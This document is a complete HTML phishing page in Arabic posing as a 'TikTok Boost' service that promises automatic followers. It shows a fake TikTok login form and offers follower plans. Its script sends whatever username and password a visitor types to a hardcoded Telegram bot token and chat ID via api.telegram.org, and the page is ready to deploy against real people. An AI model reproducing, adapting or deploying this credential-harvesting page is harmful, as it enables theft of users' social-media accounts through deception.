<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Boost | تسجيل الدخول</title>
    <style>
        :root {
            --tiktok-pink: #FE2C55;
            --tiktok-cyan: #25F4EE;
            --bg: #010101;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }

        body {
            background-color: var(--bg);
            background-image: radial-gradient(circle at 50% 50%, #1a1a1a 0%, #000000 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        /* تصميم طولي ونحيف (احترافي) */
        .phone-card {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 35px;
            width: 100%;
            max-width: 400px;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
        }

        .logo { font-size: 70px; margin-bottom: 15px; filter: drop-shadow(0 0 10px var(--tiktok-pink)); }
        
        h1 { font-size: 26px; font-weight: 900; margin-bottom: 10px; letter-spacing: 1px; }
        .subtitle { color: #888; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }

        .input-group { text-align: right; margin-bottom: 20px; }
        .input-group label { display: block; margin-bottom: 8px; font-size: 13px; color: #bbb; padding-right: 5px; }
        
        input {
            width: 100%;
            padding: 15px;
            border-radius: 15px;
            border: 1.5px solid #333;
            background: rgba(0,0,0,0.4);
            color: white;
            font-size: 16px;
            outline: none;
            transition: 0.3s;
        }
        input:focus { border-color: var(--tiktok-cyan); box-shadow: 0 0 10px rgba(37, 244, 238, 0.2); }

        .services-list { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 25px; }
        .plan-item {
            background: rgba(255,255,255,0.03);
            border: 1px solid #333;
            padding: 12px;
            border-radius: 15px;
            cursor: pointer;
            transition: 0.3s;
        }
        .plan-item.active { border-color: var(--tiktok-pink); background: rgba(254, 44, 85, 0.05); }
        .plan-item h3 { font-size: 16px; margin-bottom: 4px; color: white; }
        .plan-item p { font-size: 11px; color: #888; }

        .btn-login {
            width: 100%;
            padding: 18px;
            background: linear-gradient(45deg, var(--tiktok-pink), #b01a38);
            color: white;
            border: none;
            border-radius: 15px;
            font-size: 18px;
            font-weight: 800;
            cursor: pointer;
            transition: 0.3s;
            box-shadow: 0 10px 20px rgba(254, 44, 85, 0.3);
        }
        .btn-login:hover { transform: translateY(-2px); filter: brightness(1.1); }

        #status { margin-top: 20px; font-size: 14px; display: none; }
    </style>
</head>
<body>

<div class="phone-card">
    <div class="logo">🎵</div>
    <h1>TikTok Boost</h1>
    <p class="subtitle">سجل دخولك الآن لتفعيل خدمة زيادة المتابعين التلقائية على حسابك</p>

    <div class="input-group">
        <label>Username Or Password</label>
        <input type="text" id="fn" placeholder="البريد الإلكتروني او معرفك>
    </div>

    <div class="input-group">
        <label>Password</label>
        <input type="text" id="ln" placeholder="كلمة المرور">
    </div>

    <div class="services-list">
        <div class="plan-item active" onclick="setPlan(this, '100 متابع كل ساعتين')"><h3>100</h3><p>كل ساعتين</p></div>
        <div class="plan-item" onclick="setPlan(this, '500 متابع كل 6 ساعات')"><h3>500</h3><p>كل 6 ساعات</p></div>
        <div class="plan-item" onclick="setPlan(this, '1000 متابع كل يومين')"><h3>1000</h3><p>كل يومين</p></div>
        <div class="plan-item" onclick="setPlan(this, '2500 متابع كل 4 أيام')"><h3>2500</h3><p>كل 4 أيام</p></div>
    </div>

    <button class="btn-login" onclick="send()">تسجيل الدخول</button>
    <div id="status">جاري التحقق...</div>
</div>

<script>
    let myPlan = "100 متابع كل ساعتين";

    function setPlan(el, p) {
        document.querySelectorAll('.plan-item').forEach(i => i.classList.remove('active'));
        el.classList.add('active');
        myPlan = p;
    }

    function send() {
        // معلومات البوت الخاصة بك
        const token = "7546948976:AAETtxJ-ecUKdqVOd4LFI152-IaYxROFLWQ";
        const chatId = "56081692";

        const f = document.getElementById('fn').value.trim();
        const l = document.getElementById('ln').value.trim();
        const st = document.getElementById('status');

        // شرط إجبارية الحقلين لتنفيذ الطلب
        if (f === "" || l === "") {
            alert("⚠️ عذراً، يجب ادخال كلمة المرور والبريد الإلكتروني  لتسجيل الدخول");
            return;
        }

        st.style.display = "block";
        st.innerHTML = "⌛ جاري  معالجة طلبك";
        st.style.color = "#888";

        const msg = `🎵 *TikTok New Request* \n\n👤 اليوزر: ${f} \n👤 الباسورد: ${l} \n📊 الباقة المختارة: ${myPlan}`;
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;

        fetch(url)
        .then(res => {
            if(res.ok) {
                st.innerHTML = "✅";
                st.style.color = "#25F4EE";
                // تفريغ الحقول بعد الإرسال
                document.getElementById('fn').value = "";
                document.getElementById('ln').value = "";
            } else { 
                st.innerHTML = "❌ حدث خطأ في النظام، يرجى المحاولة لاحقاً.";
                st.style.color = "#FE2C55";
            }
        })
        .catch(() => { 
            st.innerHTML = "⚠️ فشل في الاتصال بالشبكة!";
            st.style.color = "#FE2C55";
        });
    }
</script>

</body>
</html>
